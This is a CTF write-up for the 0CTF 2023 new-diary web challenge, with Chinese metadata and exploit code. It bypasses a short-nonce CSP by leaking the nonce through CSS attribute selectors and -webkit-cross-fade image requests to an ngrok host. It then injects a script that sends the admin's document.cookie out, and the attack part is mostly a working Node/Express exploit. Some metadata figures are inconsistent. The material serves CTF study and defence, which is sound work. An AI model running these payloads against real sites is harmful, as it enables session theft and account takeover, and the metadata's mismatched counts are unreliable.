---
title: 0CTF 2023 筆記 (CSP nonce bypass)
contest: 0CTF/TCTF 2023
year: 2023
difficulty: insane
vuln_type:
- xss
- web_unknown
tags:
- CSP-bypass
- nonce
- CSS-injection
- webkit-cross-fade
- script-src
- DOM-XSS
- hash
- URL
- puppeteer
- ngrok
- CSS-exfil
- background-image
attack_chain:
- URL hash 解析：location.hash.slice(1) 拿 id/username
- DOM XSS：document.getElementById('content').innerHTML = data.content（无 sanitize）
- 'CSP 限制: script-src ''nonce-<nonce>''; frame-src ''none''; object-src ''none''; base-uri ''self''; style-src ''unsafe-inline'' https://unpkg.com'
- Style-src unsafe-inline 允许内联 CSS → CSS 注入
- 'CSS 攻击：script[nonce*=X]{--X: url(https://attacker/leak?q=X)}'
- webkit-cross-fade 触发 238328 次 36^3 子域爆破恢复 nonce
- nonce 长度 3 字符（a-z0-9）共 36^3 = 46656 种可能，分 3 批爆破
- 拿到 nonce 后注入 <script nonce> 拿 admin cookie / flag
- puppeteer admin bot 触发 → 30s 内完成
key_payload: aaa\
one_liner: CSP nonce 爆破 + CSS 属性选择器 + webkit-cross-fade exfil
lesson: CSP nonce 太短可爆破；style-src unsafe-inline 配合 CSS 属性选择器可偷 nonce；web 攻击面极广
quality: high
full_path: 0CTF_2023_筆記.full.md
meta_path: 0CTF_2023_筆記.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 0CTF 2023 筆記 (CSP nonce bypass)。CSP nonce 爆破 + CSS 属性选择器 + webkit-cross-fade exfil。关键路径：URL hash 解析：location.hash.slice(1) 拿 id/username → DOM XSS：document.getElementById('content').innerHTML = dat...
category: web
subcategory: xss
subcategories:
- xss
- web_other
time_required: long
difficulty_score: 5
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/151194.html
reasoning_chain:
- 题目 hash 解析 → fetch /share/read/:id → response.content 直接 innerHTML → 触发点：DOM XSS
- 假设：能注 HTML 但不能跑 script（CSP 限制 nonce）→ 动作：读 CSP 头
- 观察：script-src 'nonce-...' 严格 + style-src 'unsafe-inline' → 假设：style-src 是突破口
- nonce 是 3 字符 a-z0-9 = 36³ = 46656 种可能 → 假设：可爆破
- 动作：用 CSS 属性选择器 script[nonce*=X] 触发 background-image → 观察：泄漏 nonce
- 3 字符 46656 条规则单次塞爆 → 假设：必须分批 → 动作：3 批各 15500 条规则
- 观察：webkit-cross-fade 触发 background-image 请求 → 下一步：用 ngrok 接收 leak
- 假设：拿到 nonce 后就能跑 script → 动作：写 <script nonce=...>document.location='//attacker/?c='+document.cookie
- 观察：admin bot 30s 内触发 → 完成
failed_attempts:
- 试图用 <img src=x onerror=...> → 失败：script-src nonce 限制所有 script 执行
- 试图用 <iframe> → 失败：frame-src 'none'
- 试图用 <script src='https://unpkg.com/...'> → 失败：unpkg 不允许作为 nonce 替代
- 试图单次塞 46656 条 CSS → 失败：CSS 规则数上限，浏览器崩溃
key_observations:
- CSP nonce 太短（<16 字节）= 可爆破
- style-src unsafe-inline 配合 CSS 属性选择器可偷 nonce
- webkit-cross-fade 是触发 background-image 请求的关键 CSS 函数
- DOM XSS 永远不要 innerHTML 不可信数据
- admin bot 30s 窗口期需要预加载 leak endpoint
prerequisites:
- CSP 指令详解（script-src / style-src / frame-src / object-src）
- CSS 属性选择器 [attr*=val] 的 exfil 用法
- Puppeteer / Chrome DevTools Protocol
- DOM XSS 与反射 XSS 的区别
---
# 0CTF 2023 筆記

> 原文: https://www.ctfiot.com/151194.html
> ID: 151194


```
load = () => {
 document.getElementById("title").innerHTML = ""
 document.getElementById("content").innerHTML = ""
 const param = new URLSearchParams(location.hash.slice(1));
 const id = param.get('id');
 let username = param.get('username');
 if (id && /^[0-9a-f]+$/.test(id)) {
 if (username === null) {
 fetch(`/share/read/${id}`).then(data => data.json()).then(data => {
 const title = document.createElement('p');
 title.innerText = data.title;
 document.getElementById("title").appendChild(title);

 const content = document.createElement('p');
 content.innerHTML = data.content;
 document.getElementById("content").appendChild(content);
 })
 } else {
 fetch(`/share/read/${id}?username=${username}`).then(data => data.json()).then(data => {
 const title = document.createElement('p');
 title.innerText = data.title;
 document.getElementById("title").appendChild(title);

 const content = document.createElement('p');
 content.innerHTML = data.content;
 document.getElementById("content").appendChild(content);
 })
 }
 document.getElementById("report").href = `/report?id=${id}&username=${username}`;
 }
 window.removeEventListener('hashchange', load);
}
load();
window.addEventListener('hashchange', load);
<meta http-equiv="Content-Security-Policy"
 content="script-src 'nonce-<%= nonce %>'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline' https://unpkg.com">
await page.goto(
 `http://localhost/share/read#id=${id}&username=${username}`,
 { timeout: 5000 }
);
await new Promise((resolve) => setTimeout(resolve, 30000));
await page.close();
script[nonce*="aaa"]{--aaa:
url("https://server/leak?q=aaa")}
script[nonce*="aab"]{--aab:
url("https://server/leak?q=aab")}
...
script[nonce*="ZZZ"]{--ZZZ:
url("https://server/leak?q=ZZZ")}

script{
 display: block;
 background-image: -webkit-cross-fade(
 var(--aaa, none),
 -webkit-cross-fade(
 var(--aab, none), var(--ZZZ, none), 50%
 ),
 50%
 )
const fs = require('fs')
let chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
const host = 'https://ip.ngrok-free.app'

let arr = []
for(let a of chars) {
 for(let b of chars) {
 for(let c of chars) {
 let str = a+b+c;
 arr.push(str)
 }
 }
}

let payload1 = ''
let crossPayload1 = 'url("/")'
let payload2 = ''
let crossPayload2 = 'url("/")'
let payload3 = ''
let crossPayload3 = 'url("/")'

const third = Math.floor(arr.length / 3);
const arr1 = arr.slice(0, third);
const arr2 = arr.slice(third, 2 * third);
const arr3 = arr.slice(2 * third);

for(let str of arr1) {
 payload1 += `script[nonce*="${str}"]{--${str}:
url("${host}/leak?q=${str}")}\n`
 crossPayload1 = `-webkit-cross-fade(${crossPayload1}, var(--${str}, none), 50%)`
}

for(let str of arr2) {
 payload2 += `script[nonce*="${str}"]{--${str}:
url("${host}/leak?q=${str}")}\n`
 crossPayload2 = `-webkit-cross-fade(${crossPayload2}, var(--${str}, none), 50%)`
}

for(let str of arr3) {
 payload3 += `script[nonce*="${str}"]{--${str}:
url("${host}/leak?q=${str}")}\n`
 crossPayload3 = `-webkit-cross-fade(${crossPayload3}, var(--${str}, none), 50%)`
}

payload1 = `${payload1} script{display:
block;} script{background-image: ${crossPayload1}}`
payload2 = `${payload2}script:
after{content:'a';display:
block;background-image:${crossPayload2} }`
payload3 = `${payload3}script:
before{content:'a';display:
block;background-image:${crossPayload3} }`

fs.writeFileSync('exp1.css', payload1, 'utf-8');
fs.writeFileSync('exp2.css', payload2, 'utf-8');
fs.writeFileSync('exp3.css', payload3, 'utf-8');
import express from 'express'
import {fetch, CookieJar} from "node-fetch-cookies";

const app = express()
const port = 3000

const host = 'http://new-diary.ctf.0ops.sjtu.cn'
const selfHost = 'https://ip.ngrok-free.app'
const cssUrl = 'https://unpkg.com/your_pkg@1.0.0'

const getRandomStr = len => Array(len).fill().map(_ => Math.floor(Math.random()*16).toString(16)).join('')

let leaks = []
let cookieJar = new CookieJar();
let username = '';
let hasToken = false;

function mergeWords(arr, ending) {
 if (arr.length === 0) return ending
 if (!ending) {
 for(let i=0; i<arr.length; i++) {
 let isFound = false
 for(let j=0; j<arr.length; j++) {
 if (i === j) continue

 let suffix = arr[i][1] + arr[i][2]
 let prefix = arr[j][0] + arr[j][1]

 if (suffix === prefix) {
 isFound = true
 continue
 }
 }
 if (!isFound) {
 console.log('ending:', arr[i])
 return mergeWords(arr.filter(item => item!==arr[i]), arr[i])
 }
 }

 console.log('Error, please try again')
 return
 }

 let found = []
 for(let i=0; i<arr.length; i++) {
 let length = ending.length
 let suffix = ending[0] + ending[1]
 let prefix = arr[i][1] + arr[i][2]

 if (suffix === prefix) {
 found.push([arr.filter(item => item!==arr[i]), arr[i][0] + ending])
 }
 }

 return found.map((item) => {
 return mergeWords(item[0], item[1])
 })
}

function handleLeak() {
 let str = ''
 let arr = [...leaks]
 leaks = []

 console.log('received:', arr)
 const merged = mergeWords(arr, null);
 console.log('leaked:', merged.flat(99))
 return merged.flat(99)
}

async function createNote(title, content){
 return await fetch(cookieJar, host + '/write', {
 method: 'POST',
 headers: {
 'content-type': 'application/x-www-form-urlencoded',
 },
 body: `title=${encodeURIComponent(title)}&content=${encodeURIComponent(content)}`
 })
}

async function getNotes() {
 return await fetch(cookieJar, host + '/', {
 }).then(res => res.text())
}

async function share(id) {
 return await fetch(cookieJar, host + '/share_diary/' + id, {
 }).then(res => res.text())
}

async function report(username, id) {
 return await fetch(cookieJar, `${host}/report?username=${username}&id=${id}` , {
 }).then(res => res.text())
}

app.get('/', (req, res) => {
 res.send('Hello World!')
})

app.get('/start', async (req, res) => {
 // create ccount
 username = getRandomStr(8)
 let password = getRandomStr(8)
 leaks = []
 hasToken = false

 console.log({
 username,
 password
 })

 const response = await fetch(cookieJar, host + '/login', {
 method: 'post',
 headers: {
 'content-type': 'application/x-www-form-urlencoded'
 },
 body: `username=${username}&password=${password}`
 })

 const resp = await createNote('note1', `<meta http-equiv="refresh" content="0;URL=${selfHost}/exp">`)

 await createNote('note2', ``)

 console.log('done')

 await share(0)
 await share(1)

 console.log('report username:', username)
 console.log(await report(username, 0))

 res.send('done')

})

app.get('/leak', async (req, res) => {
 leaks.push(req.query.q)
 console.log('recevied:', req.query.q, leaks.length)
 if (leaks.length === 30) {
 const result = handleLeak()
 // create a new note
 await createNote(
 'note3',
 result.map(nonce => `top.location='${selfHost}/flag?q='+encodeURIComponent(top.document.cookie)</script>">`)
 );
 await share(2)
 hasToken = true;
 console.log('note3 cteated')
 }
 res.send('ok')
})

app.get('/flag', (req, res) => {
 console.log('flag', req.query.q)
 res.send('flag')
})

app.get('/hasToken', (req, res) => {
 console.log('polling...', hasToken)
 if (hasToken) {
 res.send('hasToken')
 } else {
 res.send('no')
 }
})

app.get('/exp', (req, res) => {
 console.log('visit exp')
 res.setHeader('content-type', 'text/html')
 res.send(`
 <script>
 let w = window.open('http://localhost/share/read#id=1&username=${username}')
 function polling() {
 fetch('/hasToken').then(res => res.text()).then((res) => {
 if (res === 'hasToken') {
 w.location = 'http://localhost/share/read#id=2&username=${username}'
 }
 })

 setTimeout(() => {
 polling();
 }, 500)
 }
 polling()
 </script>
 `)
})

app.listen(port, () => {
 console.log(`Example app listening on port ${port}`)
})
```
